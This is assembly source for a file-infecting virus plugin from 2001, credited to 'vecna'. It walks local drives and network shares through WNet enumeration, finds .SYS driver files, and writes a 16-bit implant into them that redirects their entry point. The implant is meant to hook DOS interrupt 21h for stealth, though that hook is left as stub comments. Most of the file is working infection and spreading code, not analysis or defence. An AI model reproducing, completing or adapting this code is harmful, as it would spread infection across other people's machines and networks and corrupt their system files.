;hide wsock32.dll from file searches while win32 is not running, by a int21
;hook made by .sys infection

;(c) vecna 2001

BITS 32

%include "\muazzin\muazzin.asi"

TYPE    EQU "isys"
VERSION EQU 0001h

entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_APP
       jnz sys_stealth
       test dword [esi+m_why], MT_QUERY
       jz .exit
       mov esi, MT_QUERY+MT_APP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
  .exit:
       ret 4

sys_stealth:
       pushad
       call dllinit
       jc near .error
       lea eax, [ebp+infect_sys]
       push eax
       call busca_recursiva
       lea eax, [ebp+infect_sys2]
       push eax
       push byte 0
       call NetSearch
  .error:
       call dlldone
       popad
       mov dword [esi+m_result], MR_DONE
       ret 4

infect_sys:
       pushad
       mov esi, [esp+(8*4)+4]
       push dword 3*1000                ;3 seconds...
  .seek0end:
       lodsb
       test al, al
       jnz .seek0end
       mov eax, dword [esi-5]
       and eax, 0dfdfdfffh
       cmp eax, ".SYS"
       jne near .done
       call delta
%ifdef DEBUG
       pushad
       sub esp, 100h
       push byte 4
       call .zkips1
       db "Infectar este arquivo?", 0
  .zkips1:
       push dword [esp+(8*4)+8+(8*4)+100h+2*4]
       push byte 0
       call [ebp+MessageBoxA]
       cmp eax, 7
       jz near .done
%endif
       add dword [esp],7*1000           ;10 seconds...

       push dword implant_size
       push byte READWRITE
       push dword [esp+(8*4)+8+8]
       call map

       mov ebx,[ebp+handle3]
       mov esi, ebx
       lodsd
       inc eax
       jnz .error

       lodsw
       mov edi,esi
       lodsw
       mov [ebp+original_sys],ax

       mov edx,[ebp+DTAbuffer+32]

       sub eax,edx
       cmp eax,implant_size
       je .done

       cmp edx,64*1024-(implant_size*2)
       jae .done

       mov eax,edx
       stosw
       lea edi,[ebx+edx]
       lea esi,[ebp+sys_main]
       mov ecx, implant_size
       rep movsb

       add dword [ebp+DTAbuffer+32],implant_size
  .error:
       call unmap

       add dword [esp],20*1000          ;30 seconds...
  .done:
       call [ebp+Sleep]
       popad
       ret 4

%define CUT_EXTRA 1

%include "\muazzin\samples\maplib.asi"

infect_sys2:
       pushad
       call delta
       mov eax, [esp+8*4+4]
       push eax
       call [ebp+SetCurrentDirectoryA]
       test eax, eax
       jz .done
       lea eax, [ebp+infect_sys]
       push eax
       call busca_disco                         ;busca dentro dos diretorios
  .done:
       popad
       ret 4

%include "\muazzin\samples\search2.asi"

%include "\muazzin\samples\localnet.asi"

delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret

dllinit:
       call delta
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       lea esi, [ebp+import_table]
  .next_dll:
       lodsd
       test eax, eax
       jz .all_import
       push esi
       stc
       sbb ebx, ebx
       lea esi, [eax+ebp]
       push esi
       mov eax, 12345678h
  getmhnd equ $-4
       call eax
       test eax, eax
       jnz .dll_in_mem
       push esi
       call [ebp+LoadLibraryA]
       test eax, eax
       jz .error
       mov ebx, eax
  .dll_in_mem:
       xchg ebx, eax                            ;ebx==module handle
       mov ecx, [esp]
       mov [ecx-4], eax                         ;-1==no unload dll
  .skip_dllname:
       lodsb
       test al, al
       jnz .skip_dllname
  .next_import:
       lodsd
       test eax, eax
       jz .dll_done
       add eax, ebp
       push eax
       push ebx
       mov eax, 12345678h
  getpaddr equ $-4
       call eax
       mov [esi-4], eax
       test eax, eax
       jz .error
       jmp short .next_import
  .dll_done:
       pop esi
       jmp short .next_dll
  .error:
       pop esi
       stc
       db 0b0h
  .all_import:
       clc
       ret

dlldone:
       lea esi, [ebp+import_table]
  .next_unload:
       lodsd
       test eax, eax
       jz .all_unload
       inc eax
       jz .next_unload
       dec eax
       push eax
       call [ebp+FreeLibrary]
       jmp short .next_unload
  .all_unload:
       ret

BITS 16

sys_main:
       push es
       push ds
       push cs
       pop ds
       mov word [6], 1234h
  original_sys equ $-2
       ;***hook int 21
  .back2sys:
       pop ds
       pop es
       push word [cs:6]
       ret

int21:
       pusha
       ;***check4win
       jne .do21
       ;***stealth ff/fn+fcb
  .do21:
       popa
       db 0eah
int21ofs dw 0
int21seg dw 0

implant_size equ $-sys_main

BITS 32

import_table dd kernel32
             dd mpr
%ifdef DEBUG
             dd user32
%endif
             dd 0

kernel32    db "KERNEL32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
.api010     dd .apiname010
.api011     dd .apiname011
.api012     dd .apiname012
.api013     dd .apiname013
.api014     dd .apiname014
.api015     dd .apiname015
.api016     dd .apiname016
.api017     dd .apiname017
.api018     dd .apiname018
.api019     dd .apiname019
.api020     dd .apiname020
            dd 0
.apiname001 db "LoadLibraryA", 0
.apiname002 db "FreeLibrary", 0
.apiname003 db "CreateFileA", 0
.apiname004 db "CloseHandle", 0
.apiname005 db "SetCurrentDirectoryA", 0
.apiname006 db "GetDriveTypeA", 0
.apiname007 db "GetTickCount", 0
.apiname008 db "CreateFileMappingA", 0
.apiname009 db "MapViewOfFile", 0
.apiname010 db "UnmapViewOfFile", 0
.apiname011 db "Sleep", 0
.apiname012 db "GlobalAlloc", 0
.apiname013 db "FindNextFileA", 0
.apiname014 db "FindFirstFileA", 0
.apiname015 db "FindClose", 0
.apiname016 db "SetFileAttributesA", 0
.apiname017 db "SetFileTime", 0
.apiname018 db "GlobalFree", 0
.apiname019 db "SetFilePointer", 0
.apiname020 db "SetEndOfFile", 0


LoadLibraryA       equ kernel32.api001
FreeLibrary        equ kernel32.api002
CreateFileA        equ kernel32.api003
CloseHandle        equ kernel32.api004
SetCurrentDirectoryA equ kernel32.api005
GetDriveTypeA      equ kernel32.api006
GetTickCount       equ kernel32.api007
CreateFileMappingA equ kernel32.api008
MapViewOfFile      equ kernel32.api009
UnmapViewOfFile    equ kernel32.api010
Sleep              equ kernel32.api011
GlobalAlloc        equ kernel32.api012
FindNextFileA      equ kernel32.api013
FindFirstFileA     equ kernel32.api014
FindClose          equ kernel32.api015
SetFileAttributesA equ kernel32.api016
SetFileTime        equ kernel32.api017
GlobalFree         equ kernel32.api018
SetFilePointer     equ kernel32.api019
SetEndOfFile       equ kernel32.api020

%ifdef DEBUG
user32      db "USER32.DLL", 0
.api001     dd .apiname001
            dd 0
.apiname001 db "MessageBoxA", 0
MessageBoxA equ user32.api001
%endif

mpr         db "MPR.DLL",0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname002
            dd 0
.apiname001 db "WNetOpenEnumA", 0
.apiname002 db "WNetEnumResourceA", 0
.apiname003 db "WNetCloseEnum", 0

WNetOpenEnumA     equ mpr.api001
WNetEnumResourceA equ mpr.api002
WNetCloseEnum     equ mpr.api003

